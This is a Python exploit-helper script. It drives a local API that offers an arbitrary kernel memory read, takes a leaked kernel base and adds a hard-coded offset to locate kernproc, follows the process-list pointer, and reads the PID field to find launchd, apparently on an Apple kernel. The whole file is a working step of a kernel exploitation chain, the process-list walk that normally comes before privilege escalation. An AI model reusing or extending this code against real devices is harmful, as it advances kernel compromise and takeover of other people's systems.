#!/usr/bin/env python3
import os
import sys
import time
import struct
import requests

API_BASE = os.environ.get('API_BASE', 'http://127.0.0.1:8000')
TIMEOUT = 15

def api_get(path, params=None):
    url = API_BASE + path
    r = requests.get(url, params=params, timeout=TIMEOUT)
    r.raise_for_status()
    return r.json()

def api_post(path, json=None):
    url = API_BASE + path
    r = requests.post(url, json=json, timeout=TIMEOUT)
    r.raise_for_status()
    return r.json()

def kread(addr, size):
    resp = api_post('/api/v1/kread', json={'addr': hex(addr), 'size': size})
    if not isinstance(resp, dict):
        raise RuntimeError('kread: unexpected response')
    if 'value' in resp:
        val = resp['value']
        if isinstance(val, str) and val.startswith('0x'):
            b = bytes.fromhex(val[2:])
        else:
            # fallback decimal
            b = struct.pack('<Q', int(resp.get('value_dec', 0)))
    elif 'data' in resp:
        d = resp['data']
        if isinstance(d, str):
            hexs = d[2:] if d.startswith('0x') else d
            b = bytes.fromhex(hexs)
        elif isinstance(d, list):
            b = bytes(d)
        else:
            raise RuntimeError('kread: unsupported data')
    else:
        raise RuntimeError('kread: missing fields')
    if len(b) < size:
        b = b.ljust(size, b'\x00')
    return b[:size]

def main():
    print(f'API_BASE={API_BASE}')
    # poll /api/v1/ds three times
    ds_vals = []
    for i in range(3):
        try:
            print(f'[{i+1}] GET /api/v1/ds...')
            ds = api_get('/api/v1/ds')
            print('RAW:', ds)
            ds_vals.append(ds)
        except Exception as e:
            print('ERROR fetching /api/v1/ds:', e)
            sys.exit(1)
        if i < 2:
            time.sleep(2)

    # compute kernel_base
    if not isinstance(ds_vals[-1], dict):
        print('Invalid /api/v1/ds response')
        sys.exit(1)
    ds = ds_vals[-1]
    if 'kernel_base' not in ds:
        print('kernel_base not found in /api/v1/ds')
        sys.exit(1)
    kernel_base = int(ds['kernel_base'], 0)
    print(f'kernel_base = 0x{kernel_base:016x}')
    kernproc = kernel_base + 0x96B928
    print(f'Computed kernproc = kernel_base + 0x96B928 = 0x{kernproc:016x}')

    # read 8 bytes at kernproc + 0x0
    probe_addr = kernproc + 0x0
    try:
        print(f'Reading 8 bytes at kernproc+0x0 -> 0x{probe_addr:016x} (le_next candidate)')
        b = kread(probe_addr, 8)
    except Exception as e:
        print('ERROR reading le_next pointer:', e)
        sys.exit(1)
    nxt = int.from_bytes(b, 'little')
    print(f'Read value = 0x{nxt:016x}')

    # critical check
    if not hex(nxt).startswith('0xffff'):
        print('CRITICAL: read pointer does NOT start with 0xffff; aborting. Pointer:', hex(nxt))
        sys.exit(1)
    print('Pointer looks valid (kernel pointer)')

    # read PID at nxt + 0x28
    pid_addr = nxt + 0x28
    try:
        print(f'Reading PID (4 bytes) at 0x{pid_addr:016x}...')
        pb = kread(pid_addr, 4)
    except Exception as e:
        print('ERROR reading PID:', e)
        sys.exit(1)
    pid = int.from_bytes(pb, 'little')
    print(f'PID at 0x{pid_addr:016x} = {pid}')
    if pid == 1:
        print('Found launchd (PID 1) at pointer 0x{0:016x}'.format(nxt))
        sys.exit(0)
    else:
        print('Did not find launchd at this pointer')
        sys.exit(2)

if __name__ == "__main__":
    main()
